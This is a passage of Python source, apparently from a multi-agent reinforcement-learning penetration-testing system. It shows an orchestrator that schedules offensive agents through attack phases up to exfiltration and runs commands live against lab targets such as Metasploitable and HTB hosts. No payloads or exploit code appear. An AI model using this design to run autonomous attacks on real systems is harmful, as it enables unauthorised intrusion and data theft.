                _init_modules.append(("DebugTracer", "ok", f"run={_run_id}"))
        except Exception as e:
            _init_modules.append(("DebugTracer", "warn", str(e)[:40]))

        # ─── PHASE 6.1: Live Command Executor ────────────────────────
        # In LIVE mode, all agent commands are executed via subprocess
        # against the real target. In SIM mode, this stays None and
        # _generate_simulated_output() is used instead.
        # These two paths NEVER mix.
        self.live_executor = None
        # _is_live_mode already set above (before coaches init)
        if self._is_live_mode:
            try:
                from core.execution.live_executor import LiveCommandExecutor
                target = getattr(env, 'live_target_ip', None) or self.config.default_target
                dry_run = os.environ.get("ARIASKA_DRY_RUN", "0") == "1"
                self.live_executor = LiveCommandExecutor(
                    target_ip=target,
                    dry_run=dry_run,
                    allowed_hostnames=["*.htb"],
                )
                _init_modules.append(("LiveExecutor", "ok", f"target={target}"))
            except Exception as e:
                _init_modules.append(("LiveExecutor", "fail", str(e)[:40]))
                self._is_live_mode = False  # Fall back to sim
        
        # ─── Phase 40: SSH Session Pool ─────────────────────────────
        self._ssh_pool = None
        try:
            from core.feature_flags import get_feature_flags as _p40_ff
            if getattr(_p40_ff(), 'ssh_pool', False):
                from core.execution.ssh_pool import SSHSessionPool
                self._ssh_pool = SSHSessionPool()
                _init_modules.append(("SSHPool", "ok", "persistent sessions"))
        except Exception as e:
            _init_modules.append(("SSHPool", "warn", str(e)[:40]))

        # ─── Phase 40: Command Pool Narrower ────────────────────────
        self._pool_narrower = None
        try:
            from core.feature_flags import get_feature_flags as _p40_ff2
            if getattr(_p40_ff2(), 'pool_narrower', False):
                from core.ops.pool_narrower import CommandPoolNarrower
                self._pool_narrower = CommandPoolNarrower()
                _init_modules.append(("PoolNarrower", "ok", "adaptive filter"))
        except Exception as e:
            _init_modules.append(("PoolNarrower", "warn", str(e)[:40]))

        # ─── Restore logging level ──────────────────────────────────
        logging.getLogger().setLevel(_prev_log_level)
        
        # ─── Print Rich init summary ────────────────────────────────
        if self.dashboard is not None:
            self.dashboard.print_init_progress(_init_modules)
        
        logger.debug(
            f"SmartOrchestrator initialized with {len(self.agents)} agents "
            f"(mode={'LIVE' if self._is_live_mode else 'SIM'})"
        )

        # =====================================================================
        # PHASE 41: Submodule delegation — companion classes for modularity.
        # SmartOrchestrator delegates specific operations to extracted classes.
        # =====================================================================
        from core.orchestration.output_parser import DiscoveryResult
        from core.orchestration.state_builder import StateSnapshot
        from core.orchestration.episode_runner import EpisodeTracker
        from core.orchestration.flag_detector import FlagMatch

        self._discovery_result_cls = DiscoveryResult
        self._state_snapshot_cls = StateSnapshot
        self._episode_tracker = EpisodeTracker()
        self._flag_match_cls = FlagMatch
        logger.debug("[P41] Orchestrator submodule delegation initialized")

        # =====================================================================
        # PHASE 42: Deep wiring — lazy-init placeholders
        # =====================================================================
        self._her: Optional[Any] = None  # HindsightReplay, lazy init
        self._meta_learner: Optional[Any] = None  # ReflectiveMetaLearner
        self._reflection_context: str = ""
        self._evidence_graph: Optional[Any] = None  # EvidenceGraph
        self._ttf_tracker: Optional[Any] = None  # TTFTracker

    # =========================================================================
    # PHASE 42: Deep Wiring Methods
    # =========================================================================

    def _wire_her(self) -> None:
        """Lazy-init and invoke HindsightReplay on episode transitions."""
        if self._her is None:
            try:
                from core.feature_flags import get_feature_flags
                if not get_feature_flags().her_wiring:
                    return
                from core.algorithms.hindsight_replay import HindsightReplay
                self._her = HindsightReplay()
                logger.info("HindsightReplay wired successfully")
            except Exception as e:
                logger.warning("HindsightReplay init failed: %s", e)
                return

        if not hasattr(self, '_ppo_trajectory') or not self._ppo_trajectory:
            return

        try:
            transitions = list(self._ppo_trajectory)
            if not transitions:
                return
            phases = [t.get("phase", 0) if isinstance(t, dict) else 0 for t in transitions]
            target_phase = max(phases) if phases else 0
            achieved_phase = phases[-1] if phases else 0
            self._her.process_episode(
                episode_transitions=transitions,
                target_phase=str(target_phase),
                achieved_phase=str(achieved_phase),
            )
            logger.debug("HER processed %d transitions", len(transitions))
        except Exception as e:
            logger.warning("HER process_episode failed: %s", e)

    def _ensure_meta_learner(self) -> Optional[object]:
        """Lazy-init ReflectiveMetaLearner if feature flag is on."""
        if self._meta_learner is not None:
            return self._meta_learner
        try:
            from core.feature_flags import get_feature_flags
            if not get_feature_flags().reflective_meta_learner:
                return None
            from core.llm.reflective_meta_learner import ReflectiveMetaLearner
            self._meta_learner = ReflectiveMetaLearner()
            logger.info("ReflectiveMetaLearner wired into SmartOrchestrator")
            return self._meta_learner
        except Exception as e:
            logger.warning("ReflectiveMetaLearner init failed: %s", e)
            return None

    def _ensure_evidence_graph(self) -> Optional[object]:
        """Lazy-init EvidenceGraph if feature flag is on."""
        if self._evidence_graph is not None:
            return self._evidence_graph
        try:
            from core.feature_flags import get_feature_flags
            if not get_feature_flags().evidence_graph_v2:
                return None
            from core.memory.evidence_graph import EvidenceGraph
            self._evidence_graph = EvidenceGraph()
            logger.info("EvidenceGraph wired into SmartOrchestrator")
            return self._evidence_graph
        except Exception as e:
            logger.warning("EvidenceGraph init failed: %s", e)
            return None

    def _ensure_ttf_tracker(self) -> Optional[object]:
        """Lazy-init TTFTracker if feature flag is on."""
        if self._ttf_tracker is not None:
            return self._ttf_tracker
        try:
            from core.feature_flags import get_feature_flags
            if not get_feature_flags().ttf_tracker:
                return None
            from core.metrics.ttf_metrics import TTFTracker
            self._ttf_tracker = TTFTracker()
            logger.info("TTFTracker wired into SmartOrchestrator")
            return self._ttf_tracker
        except Exception as e:
            logger.warning("TTFTracker init failed: %s", e)
            return None

    # =========================================================================
    # PHASE 2A: Smart Agent Activation Schedule
    # =========================================================================
    # Not all agents need to run every step. Phase-based activation saves
    # API calls by only activating agents when they're useful.
    # =====================================================================
    # P36: ROLE-BASED ACTIVATION SCHEDULE
    # Value = run every Nth step. 1 = every step, 0 = DISABLED.
    # Red always runs (primary executor). Other agents are activated
    # only when they can add value based on phase, evidence, and state.
    #
    # DESIGN PRINCIPLES:
    #   - Scout: ACTIVE in RECON/ENUM/LATERAL only (discovery phases)
    #   - Shadow: ACTIVE only when creds/shell exist (stealth matters)
    #   - Orion: ACTIVE for strategy at phase transitions, low frequency otherwise
    #   - Red: ACTIVE all phases as primary executor
    #   - Blue: Minimal — infrastructure defense only in late phases
    # =====================================================================
    AGENT_ACTIVATION_SCHEDULE = {
        "RECON": {
            "ScoutAgent": 1, "RedAgent": 1, "ShadowAgent": 0,
            "OrionAgent": 5, "BlueAgent": 0,
        },
        "ENUMERATION": {
            "ScoutAgent": 2, "RedAgent": 1, "ShadowAgent": 0,
            "OrionAgent": 4, "BlueAgent": 0,
        },
        "EXPLOITATION": {
            "ScoutAgent": 0, "RedAgent": 1, "ShadowAgent": 3,
            "OrionAgent": 3, "BlueAgent": 0,
        },
        "PRIVILEGE_ESCALATION": {
            "ScoutAgent": 0, "RedAgent": 1, "ShadowAgent": 3,
            "OrionAgent": 4, "BlueAgent": 0,
        },
        "LATERAL_MOVEMENT": {
            "ScoutAgent": 3, "RedAgent": 1, "ShadowAgent": 2,
            "OrionAgent": 3, "BlueAgent": 0,
        },
        "POST_EXPLOITATION": {
            "ScoutAgent": 0, "RedAgent": 1, "ShadowAgent": 2,
            "OrionAgent": 3, "BlueAgent": 4,
        },
        "EXFILTRATION": {
            "ScoutAgent": 0, "RedAgent": 1, "ShadowAgent": 2,
            "OrionAgent": 4, "BlueAgent": 3,
        },
        "CLOSEOUT": {
            "ScoutAgent": 0, "RedAgent": 0, "ShadowAgent": 1,
            "OrionAgent": 1, "BlueAgent": 2,
        },
    }

    # P36: Skip reason enum values for structured skip tracking
    SKIP_REASONS = {
        "disabled_in_phase": "DISABLED in {phase}",
        "no_new_value": "No new evidence to act on",
        "redundant": "Another agent covers this role",
        "phase_not_relevant": "Agent role not relevant to {phase}",
        "budget_pressure": "Token budget pressure — conserving",
        "frequency_gate": "Runs every {freq} steps",
        "shadow_no_creds": "Shadow waiting for creds/shell",
        "scout_done": "Scout: ports+services already discovered",
        "orion_no_transition": "Orion: no phase transition or stagnation",
    }

    def _should_activate(self, agent_name: str, step: int, phase: str) -> Tuple[bool, str]:
        """
        P36: Value-based agent activation with structured skip reasons.
        
        Determines if an agent should be activated this step based on:
        1. Phase-based frequency schedule
        2. Evidence-based value check (does agent have something useful to do?)
        3. Shadow gate (creds/shell required)
        4. Scout completion gate (ports+services discovered → done)
        5. Orion strategic gate (phase transitions or stagnation)
        
        Args:
            agent_name: Name of the agent
            step: Current step number (0-indexed from orchestrator)
            phase: Current attack phase (e.g. "RECON", "EXPLOITATION")
            
        Returns:
            Tuple of (should_activate, skip_reason)
            skip_reason is empty string if activated, structured reason if skipped
        """
        phase_upper = phase.upper().replace(" ", "_")
        schedule = self.AGENT_ACTIVATION_SCHEDULE.get(phase_upper, {})
        frequency = schedule.get(agent_name, 1)

        # P36: frequency=0 means agent is DISABLED for this phase
        if frequency == 0:
            return False, self.SKIP_REASONS["disabled_in_phase"].format(phase=phase_upper)

        board = getattr(self, "discovery_board", {})
        flags = board.get("flags_set", set()) if isinstance(board, dict) else set()

        # ── Shadow gate: only activate after creds or shell ──
        if agent_name == "ShadowAgent" and phase_upper not in ("CLOSEOUT",):
            has_creds = "credentials_known" in flags
            has_shell = "shell_obtained" in flags
            if not has_creds and not has_shell:
                return False, self.SKIP_REASONS["shadow_no_creds"]

        # ── Scout completion gate: skip if ports+services already discovered ──
        # Phase 39: Keep Scout active in ENUMERATION for vhost/deeper discovery
        if agent_name == "ScoutAgent" and phase_upper not in ("RECON", "ENUMERATION", "LATERAL_MOVEMENT"):
            ports = board.get("ports", []) if isinstance(board, dict) else []
            services = board.get("services", []) if isinstance(board, dict) else []
            if len(ports) >= 2 and len(services) >= 1:
                return False, self.SKIP_REASONS["scout_done"]

        # ── Orion strategic gate: only on phase transitions or stagnation ──
        if agent_name == "OrionAgent" and phase_upper not in ("CLOSEOUT",):
            # Always activate at step 0 (initial strategy)
            if step == 0:
                self._last_step_phase = phase_upper
                return True, ""
            _stag = max(
                self._steps_without_discoveries.get(a, 0)
                for a in self._steps_without_discoveries
            ) if self._steps_without_discoveries else 0
            _phase_changed = getattr(self, '_last_step_phase', None) != phase_upper
            # Orion fires on: phase transition, stagnation >=6, or frequency schedule
            if not _phase_changed and _stag < 6:
                if (step + 1) % frequency != 0:
                    return False, self.SKIP_REASONS["orion_no_transition"]

        # ── Blue gate: skip in early phases (nothing to defend yet) ──
        if agent_name == "BlueAgent" and phase_upper in ("RECON", "ENUMERATION", "EXPLOITATION"):
            return False, self.SKIP_REASONS["phase_not_relevant"].format(phase=phase_upper)

        # ── Standard frequency check ──
        if (step + 1) % frequency != 0:
            return False, self.SKIP_REASONS["frequency_gate"].format(freq=frequency)

        # Store phase for next step's transition detection
        self._last_step_phase = phase_upper

        return True, ""
    
    def _init_dashboard(self) -> LiveDashboard:
        """Initialize the live dashboard for training visibility."""
        dash_config = DashboardConfig(
            enabled=self.config.dashboard_enabled,
            mode=self.config.dashboard_mode,
            watch_rate=self.config.dashboard_watch_rate,
            show_reward_breakdown=True,
            show_discoveries=True,
            show_output=True,
            max_action_width=0,   # 0 = no limit — dynamic width
            max_output_lines=0,   # 0 = no limit — show full output
            max_output_width=0,   # 0 = no limit — dynamic width
        )
        dashboard = LiveDashboard(config=dash_config)
        logger.debug("LiveDashboard v3.0 initialized (Phase 6.5 full-visibility)")
        return dashboard
    
    def _init_agents(self):
        """Initialize all agents and wire cross-references."""
        from core.multiagent.memory_router import MemoryRouter
        
        memory_router = MemoryRouter()
        
        if self.config.enable_scout:
            try:
                from core.agents.scout_agent import ScoutAgent
                self.agents["ScoutAgent"] = ScoutAgent(
                    agent_id="ScoutAgent",
                    memory_router=memory_router,
                    verbosity=self.verbosity,
                )
            except Exception as e:
                logger.warning(f"Failed to init ScoutAgent: {e}")
        
        if self.config.enable_red:
            try:
                from core.agents.red_agent import RedAgent
                self.agents["RedAgent"] = RedAgent(
                    agent_id="RedAgent",
                    role="CyberOffense",
                    memory_router=memory_router,
                    verbosity=self.verbosity,
                    gpt_manager=self.gpt_manager,
                )
            except Exception as e:
                logger.warning(f"Failed to init RedAgent: {e}")
        
        if self.config.enable_blue:
            try:
                from core.agents.blue_agent import BlueAgent
                self.agents["BlueAgent"] = BlueAgent(
                    agent_id="BlueAgent",
                    memory_router=memory_router,
                    verbosity=self.verbosity,
                )
            except Exception as e:
                logger.warning(f"Failed to init BlueAgent: {e}")
        
        if self.config.enable_orion:
            try:
                from core.agents.orion_agent import OrionAgent
                self.agents["OrionAgent"] = OrionAgent(
                    agent_id="OrionAgent",
                    memory_router=memory_router,
                    verbosity=self.verbosity,
                )
            except Exception as e:
                logger.warning(f"Failed to init OrionAgent: {e}")
        
        if self.config.enable_shadow:
            try:
                from core.agents.shadow_agent import ShadowAgent
                self.agents["ShadowAgent"] = ShadowAgent(
                    agent_id="ShadowAgent",
                    memory_router=memory_router,
                    verbosity=self.verbosity,
                )
            except Exception as e:
                logger.warning(f"Failed to init ShadowAgent: {e}")
        
        # Wire cross-references between agents so inter-agent communication works
        self._wire_agent_cross_references()
        
        logger.debug(f"Initialized agents: {list(self.agents.keys())}")

    def _wire_agent_cross_references(self):
        """Wire direct references between agents for inter-agent communication.
        
        In SmartOrchestrator, agents are created without an AgentManager, so their
        _init_multiagent_links() never fires. This method manually sets the cross-
        references that each agent expects.
        """
        red = self.agents.get("RedAgent")
        blue = self.agents.get("BlueAgent")
        scout = self.agents.get("ScoutAgent")
        shadow = self.agents.get("ShadowAgent")
        orion = self.agents.get("OrionAgent")
        
        # RedAgent expects: self.scout, self.shadow, self.blue, self.orion
        if red:
            red.scout = scout
            red.shadow = shadow
            red.blue = blue
            red.orion = orion
        
        # BlueAgent expects: self.red, self.orion
        if blue:
            blue.red = red
            blue.orion = orion
        
        # ScoutAgent expects: self.red_agent, self.shadow_agent, self.orion_agent, self.blue_agent
        if scout:
            scout.red_agent = red
            scout.shadow_agent = shadow
            scout.orion_agent = orion
            scout.blue_agent = blue
        
        # ShadowAgent expects: self.red_agent, self.scout_agent, self.orion_agent, self.blue_agent
        if shadow:
            shadow.red_agent = red
            shadow.scout_agent = scout
            shadow.orion_agent = orion
            shadow.blue_agent = blue
        
        # OrionAgent expects: self.red_agent, self.blue_agent, self.scout_agent, self.shadow_agent
        if orion:
            orion.red_agent = red
            orion.blue_agent = blue
            orion.scout_agent = scout
            orion.shadow_agent = shadow
            # Register subordinates
            for agent in [red, blue, scout, shadow]:
                if agent and hasattr(orion, 'register_subordinate'):
                    try:
                        orion.register_subordinate(agent)
                    except Exception:
                        pass
        
        wired = sum(1 for a in [red, blue, scout, shadow, orion] if a is not None)
        logger.debug(f"Wired cross-references for {wired} agents")
    
    def _init_smart_coaches(self):
        """Initialize SmartCoach for each agent."""
        from core.training.mentor_policy import MentorPolicy, MentorPolicyConfig
        from core.training.mentor_controller import MentorController, MentorControllerConfig
        
        # Phase 11.1: Base policy config (doubled for learning acceleration)
        policy_config = MentorPolicyConfig(
            mode=self.config.mentor_mode,
            warmup_episodes=self.config.mentor_warmup_episodes,
            min_mentor_rate=self.config.mentor_min_rate,
            max_mentor_rate=self.config.mentor_max_rate,
        )
        
        # Phase 13.0: TRIPLED mentor configs for Red, Orion — maximum GPT reasoning absorption
        # These agents learn exploit reasoning, strategic planning, and autonomous decision-making
        _tripled_agents = {"RedAgent", "OrionAgent"}
        tripled_policy_config = MentorPolicyConfig(
            mode="adaptive",
            warmup_episodes=5,  # Extended warmup for deep reasoning learning
            warmup_steps_per_episode=40,  # Maximum mentor-guided early steps
            min_mentor_rate=self.config.mentor_min_rate * 3,  # 3× base minimum
            max_mentor_rate=1.0,  # Allow full mentor engagement
            min_adaptive_rate=1.0,  # Full adaptive engagement (ceiling)
            max_adaptive_rate=1.0,
            struggling_boost=3.0,     # Phase 13.0: +22% (was 2.46) — maximum boost when struggling
            performing_reduction=0.02,  # Phase 13.0: barely reduce — agents learn deep reasoning first
            max_calls_per_episode=480,  # Phase 13.0: +30% (was 369) — maximum Red/Orion learning depth
        )
        
        # Phase 6.2: Create shared MentorController (all coaches share one)
        mentor_ctrl_config = MentorControllerConfig(
            budget_pct=getattr(self.config, 'mentor_budget_pct', 0.60),
            min_rate=self.config.mentor_min_rate,
            max_rate=self.config.mentor_max_rate,
            warmup_episodes=self.config.mentor_warmup_episodes,
        )
        self.mentor_controller = MentorController(config=mentor_ctrl_config)
        
        for agent_name in self.agents.keys():
            # Phase 11.1: Tripled mentor policy for Red/Orion — they learn exploit reasoning
            if agent_name in _tripled_agents:
                policy = MentorPolicy(tripled_policy_config)
                logger.debug(f"[MENTOR-11.1] {agent_name}: TRIPLED mentor policy — min_rate={tripled_policy_config.min_mentor_rate:.2f}, max_calls=90")
            else:
                policy = MentorPolicy(policy_config)
            
            # Phase 6.9.5: Create target-aware reward calculator for live mode
            ms2_mode = self._is_live_mode
            target_profile = ""
            if ms2_mode:
                target = self.config.default_target
                if target == "172.28.0.11":
                    target_profile = "metasploitable3"
                elif target == "172.28.0.10":
                    target_profile = "metasploitable2"
                elif "172.28.0" in target:
                    target_profile = "metasploitable3"
            reward_calc = SmartRewardCalculator(
                ms2_mode=ms2_mode, target_profile=target_profile
            ) if ms2_mode else None
            
            self.coaches[agent_name] = SmartCoach(
                agent_name=agent_name,
                gpt_manager=self.gpt_manager,
                mentor_policy=policy,
                mentor_controller=self.mentor_controller,
                skill_library=self.skill_library,
                trace_writer=self.trace_writer,
                reward_calculator=reward_calc,
                mentor_log_path=None,
                model=self.config.model,
                tactical_cortex=self.tactical_cortex,
                executive_cortex=self.executive_cortex,
                budget_controller=self.budget_controller,
            )
        
        logger.debug(f"Initialized smart coaches: {list(self.coaches.keys())}")
    
    def set_run_dir(self, run_dir: str):
        """Set the run directory for logs."""
        self.run_dir = run_dir
        mentor_log_path = os.path.join(run_dir, "smart_mentor.jsonl")
        
        for coach in self.coaches.values():
            coach.mentor_log_path = mentor_log_path
    
    def init_attack(
        self,
        target: str,
        difficulty: str = "normal",
        platform: str = "unknown",
    ) -> AttackContext:
        """
        Initialize attack context for a new target.
        
        Args:
            target: Target IP or hostname
            difficulty: Target difficulty (legacy, default: normal = unrestricted)
            platform: Target platform (linux, windows, unknown)
            
        Returns:
            Shared AttackContext
        """
        self.attack_context = AttackContext(
            target=target,
            difficulty=difficulty,
            platform=platform,
            current_phase=AttackPhase.RECON,
        )
        
        # Phase 6.9.5: Detect target profile and load correct exploit graph
        self._target_profile = "generic"
        if target == "172.28.0.11":
            self._target_profile = "metasploitable3"
        elif target == "172.28.0.10":
            self._target_profile = "metasploitable2"
        elif "172.28.0" in target:
            self._target_profile = "metasploitable3"
        
        # Load target-specific exploit graph for reward shaping
        try:
            if self._target_profile == "metasploitable3":
                from core.knowledge.ms3_exploit_graph import get_ms3_graph
                self._exploit_graph = get_ms3_graph()
                logger.info(f"MS3ExploitGraph loaded: {len(self._exploit_graph.services)} services")
            elif self._target_profile == "metasploitable2":
                from core.knowledge.ms2_exploit_graph import get_ms2_graph
                self._exploit_graph = get_ms2_graph()
                logger.info(f"MS2ExploitGraph loaded: {len(self._exploit_graph.services)} services")
            else:
                self._exploit_graph = None
        except Exception as e:
            logger.warning(f"Exploit graph load failed: {e}")
            self._exploit_graph = None
        
        # Share context with all coaches
        for coach in self.coaches.values():
            coach.attack_context = self.attack_context
            # Phase 6.9.5: Inject target-specific exploit graph into reward calculators
            if hasattr(coach, 'reward_calculator') and coach.reward_calculator and self._exploit_graph:
                coach.reward_calculator._exploit_graph = self._exploit_graph
                coach.reward_calculator._ms2_graph = self._exploit_graph
                coach.reward_calculator.target_profile = self._target_profile
        
        # R66: Inject scan randomizer hints into attack context for varied initial scans
        if hasattr(self, 'scan_randomizer') and self.scan_randomizer is not None:
            self.attack_context._r66_scan_hints = self.scan_randomizer.get_randomized_initial_commands(target)  # type: ignore[attr-defined]
        else:
            self.attack_context._r66_scan_hints = []  # type: ignore[attr-defined]
        
        return self.attack_context
    
    def run_episode(  # pyright: ignore[reportGeneralClassIssues]
        self,
        episode_id: str,
        episode_number: int,
        max_steps: Optional[int] = None,
        target: Optional[str] = None,
        difficulty: Optional[str] = None,
        platform: Optional[str] = None,
    ) -> Dict[str, Any]:
        """
        Run a complete episode with smart command generation.
        
        Args:
            episode_id: Unique episode identifier
            episode_number: Episode number
            max_steps: Maximum steps (default from config)
            target: Target IP (optional, uses env or default)
            difficulty: Target difficulty
            platform: Target platform
            
        Returns:
            Episode metrics with detailed reward breakdown
        """
        max_steps = max_steps or self.config.max_steps_per_episode
        self.current_episode = episode_number
        # Phase 9.5: Track episode_id for parse cache keying
        self._current_episode_id = episode_number
        
        # Reset token budgets
        if self.gpt_manager:
            self.gpt_manager.reset_episode(episode_id=episode_number)
        
        # ─── PHASE 17: Dynamic budget scaling + mentor maturity ──────
        # Compute learning maturity from skill library + campaign memory,
        # then scale token budget ($0.50–$3.00/ep) and mentor floor (0.60→0.08).
        _maturity = 0.0
        try:
            _bm2 = getattr(self.gpt_manager, '_budget_manager_v2', None) if self.gpt_manager else None
            if _bm2 is not None and hasattr(_bm2, 'compute_dynamic_budget'):
                # Gather maturity signals
                _skill_count = len(getattr(self.skill_library, 'skills', {})) if self.skill_library else 0
                _max_skills = 200  # Approximate capacity for full MS2/MS3 coverage
                _prior = self.campaign_memory.get_prior_knowledge() if self.campaign_memory else {}
                _episodes_trained = _prior.get('episodes_completed', episode_number)
                _best_phase = _prior.get('best_phase_ever', 'RECON')
                _phase_ranks = {"RECON": 0.0, "ENUMERATION": 0.15, "EXPLOITATION": 0.4,
                                "PRIVILEGE_ESCALATION": 0.6, "LATERAL_MOVEMENT": 0.7,
                                "POST_EXPLOITATION": 0.8, "EXFILTRATION": 0.95, "CLOSEOUT": 1.0}
                _success_rate = _phase_ranks.get(_best_phase, 0.0)
                _discovery_eff = min(1.0, _prior.get('total_unique_discoveries', 0) / 30.0)
                _stagnation = max(0.0, 1.0 - _episodes_trained / max(episode_number + 1, 1)) if episode_number > 5 else 0.0
                
                _scale = _bm2.compute_dynamic_budget(
                    avg_success_rate=_success_rate,
                    skill_count=_skill_count,
                    max_skills=_max_skills,
                    discovery_efficiency=_discovery_eff,
                    stagnation_rate=_stagnation,
                    episode=episode_number,
                )
                _bm2.apply_dynamic_scale(_scale)
                _maturity = _bm2.maturity_signal
                logger.debug(
                    f"[P17-BUDGET] ep={episode_number} maturity={_maturity:.2f} "
                    f"scale={_scale:.3f} est_cost=${_bm2.estimated_cost_usd:.2f} "
                    f"skills={_skill_count} best={_best_phase}"
                )
        except Exception as e:
            logger.debug(f"Phase 17: Dynamic budget scaling error: {e}")
        
        # Phase 17: Propagate maturity to all mentor policies
        for _coach in self.coaches.values():
            _mp = getattr(_coach, 'mentor_policy', None)
            if _mp is not None and hasattr(_mp, 'set_maturity'):
                _mp.set_maturity(_maturity)
        
        # PHASE 2A: Reset per-agent GPT call counters
        for agent in self.agents.values():
            if hasattr(agent, 'gpt_calls_this_episode'):
                agent.gpt_calls_this_episode = 0
        
        # Reset coaches and reward calculator
        for coach in self.coaches.values():
            coach.reset_episode(episode_number)
        self.global_reward_calc.reset()
        
        # Phase 6.2: Reset MentorController for new episode
        if hasattr(self, 'mentor_controller') and self.mentor_controller:
            self.mentor_controller.start_episode(episode_number, max_steps)
        
        # Phase 6.2: Emit episode_start event
        if hasattr(self, 'event_bus'):
            self.event_bus.publish_generic(
                EventKind.EPISODE_START,
                message=f"Episode {episode_number} started",
                data={"episode": episode_number, "max_steps": max_steps},
                episode_id=episode_id,
                episode_num=episode_number,
            )
        
        # PHASE 3: Clear PPO trajectory for new episode
        self._ppo_trajectory = []
        
        # Phase 4: Reset discovery board
        self.discovery_board = {
            "ports": set(), "services": set(), "credentials": set(),
            "vulns": set(), "shells": set(), "users": set(),
            "web_paths": set(), "phase": "RECON", "flags_set": set(),
            # Phase 7.1: Exploited-service tracking (reset per episode)
            "exploited_services": set(), "exploited_ports": set(),
            # HTB Capability Upgrade
            "credentials_list": [], "capabilities": set(),
            "downloaded_files": set(), "hashes": [],
            # Phase 24: Flag capture values for auto-close
            "user_flag_value": "", "root_flag_value": "",
        }
        
        # Phase 5.2: Cross-agent discovery deduplication
        # Prevents 5 agents from each getting reward for the same port/service/credential
        self._episode_shared_discoveries: set = set()
        
        # ─── PHASE 42: Reflective meta-learner — context injection ───
        meta = self._ensure_meta_learner()
        if meta is not None:
            try:
                self._reflection_context = meta.get_context_injection()
            except Exception as e:
                logger.warning("ReflectiveMetaLearner context injection failed: %s", e)
                self._reflection_context = ""

        # ─── PHASE 42: Reset TTFTracker for new episode ──────────────
        if self._ttf_tracker is not None:
            try:
                self._ttf_tracker.reset()
            except Exception as e:
                logger.warning("TTFTracker reset failed: %s", e)

        # ─── PHASE 42: Reset EvidenceGraph for new episode ───────────
        if self._evidence_graph is not None:
            try:
                self._evidence_graph.reset()
            except Exception as e:
                logger.warning("EvidenceGraph reset failed: %s", e)

        # P35: Reset coherence chain for new episode
        if self.coherence_chain is not None:
            self.coherence_chain.reset()
        self._last_coherence_result = None
        from core.state.canonical_state import CanonicalStateBuilder
        CanonicalStateBuilder.reset_version()
        
        # P35: Start live trace for this episode
        if self.live_trace_writer is not None:
            self.live_trace_writer.start_episode(episode_id)
        
        # Phase 6.1: Reset live executor per-episode tracking
        if self.live_executor:
            self.live_executor.reset_episode()
        
        # ─── PHASE 6.3: Reset watchdog + smart parser per episode ────
        if self.watchdog:
            self.watchdog.reset_episode()
        if self.smart_parser:
            self.smart_parser.reset_episode()
        # Phase 9.5: Reset parse cache per episode
        if self._parse_cache:
            self._parse_cache.reset_episode()
        
        # ─── PHASE 7.2: Venice reasoning layer — DISABLED (Phase 22: GPT-only) ──
        # if self.venice_reasoning:
        #     self.venice_reasoning.reset_episode()
        
        # ─── PHASE 8: DecisionLogger episode start ──────────────────
        if self.decision_logger is not None:
            try:
                self.decision_logger.start_episode(episode_number)
            except Exception:
                pass
        
        # ─── PHASE 9: CognitiveBus episode start ────────────────────
        if self.cognitive_bus:
            try:
                target_info = target or self.config.default_target or "unknown"
                self.cognitive_bus.start_episode(
                    episode_id=episode_id,
                    target=target_info,
                    scenario=getattr(self.config, 'scenario', 'simulation'),
                )
            except Exception as e:
                logger.debug(f"Phase 9: CognitiveBus episode start failed: {e}")
        
        # ─── PHASE 8.0: Post-shell exploration tracking ─────────────
        self._shell_obtained_step: Optional[int] = None
        self.POST_SHELL_EXPLORE_STEPS = 12  # HTB: 10→12 for 60-step episodes
        
        # ─── R56: Minimum PRIV_ESC duration gate ────────────────────
        # R55 showed two-mode episodes: organic fast (11 steps, +2004 avg)
        # vs cascade slow (19 steps, +2446 avg). Organic episodes discover
        # hash_known in just 2 PRIV_ESC steps, rushing to LATERAL.
        # Gap to R48 (+2863.8) is entirely explained by step count
        # (15.1 vs 27.0, correlation: +50 reward per step).
        # Fix: Defer hash_known flag until MIN_PRIVESC_STEPS in PRIV_ESC.
        # Cascade at 12 remains as safety net for truly stuck episodes.
        self.MIN_PRIVESC_STEPS = 10
        self._deferred_hash_known = False
        
        # ─── PHASE 8.2 Batch 16: Deferred discovery queue ───────────
        # Stores (discovery_type, agent_name, step) for discoveries suppressed
        # by the post-shell gate. Re-evaluated when gate is satisfied.
        self._deferred_discoveries: list = []
        
        # ─── PHASE 8.2: Orion dual strategic reviews (2 per episode) ─────
        self._orion_review_count = 0
        
        # Reset stuck detection
        self.action_history.clear()
        self.stuck_agents.clear()
        
        # Phase 0.1: Reset per-agent stuck tracking
        self.repeat_stuck_count = {agent: 0 for agent in self.agents}
        self.deep_stuck_count = {agent: 0 for agent in self.agents}
        self.forced_novel_count = {agent: 0 for agent in self.agents}
        self._steps_without_discoveries = {agent: 0 for agent in self.agents}  # Stagnation counter
        self.phase_progressed_this_episode = False
        self._phase_start_step = {}  # R55: Start empty, populated after init
        self.episode_termination_reason = TerminationReason.MAX_STEPS
        self.previous_discoveries = {}
        
        # Reset dashboard for new episode
        self.dashboard.reset_episode()
        self.dashboard.current_episode = episode_number
        
        # ─── R66: Reset new subsystems per episode ──────────────────
        self._r66_prev_disc_count = 0  # For delta tracking in step loop
        if hasattr(self, 'coherence_tracker') and self.coherence_tracker is not None:
            self.coherence_tracker.reset_episode()
        if hasattr(self, 'rnd_curiosity') and self.rnd_curiosity is not None:
            self.rnd_curiosity.running_mean = 0.0
            self.rnd_curiosity.running_var = 1.0
            self.rnd_curiosity.count = 0
        if hasattr(self, 'scan_randomizer') and self.scan_randomizer is not None:
            self.scan_randomizer.next_episode()

        # ─── R67: Reset reward velocity + shared discovery dedup ─────
        if hasattr(self, 'reward_velocity') and self.reward_velocity is not None:
            self.reward_velocity.reset_episode()
        if hasattr(self, 'shared_discovery') and self.shared_discovery is not None:
            self.shared_discovery.reset_episode()
        
        # ─── HTB: Reset artifact store, cred reuse engine, followup queue ──
        if hasattr(self, 'artifact_store') and self.artifact_store is not None:
            self.artifact_store.reset_episode()
        if hasattr(self, 'cred_reuse_engine') and self.cred_reuse_engine is not None:
            self.cred_reuse_engine.reset()
        if hasattr(self, 'followup_queue'):
            self.followup_queue = []
        
        # Reset environment
        state = self.env.reset()
        if not state:
            state = self._default_state()
        
        # ─── Phase 39: Reset OPS subsystems for new episode ──────────
        if self.ops_hub is not None:
            try:
                self.ops_hub.reset()
            except Exception as _e:
                logger.debug(f"[P39] OpsHub reset error: {_e}")
        if self.orion_rethink is not None:
            try:
                self.orion_rethink.reset()
            except Exception as _e:
                logger.debug(f"[P39.1] OrionRethink reset error: {_e}")
        if self.trust_engine is not None:
            try:
                self.trust_engine.reset()
                self.trust_engine.register_source("mentor")
                self.trust_engine.register_source("micro_chain")
                self.trust_engine.register_source("phase_guided")
                self.trust_engine.register_source("ppo")
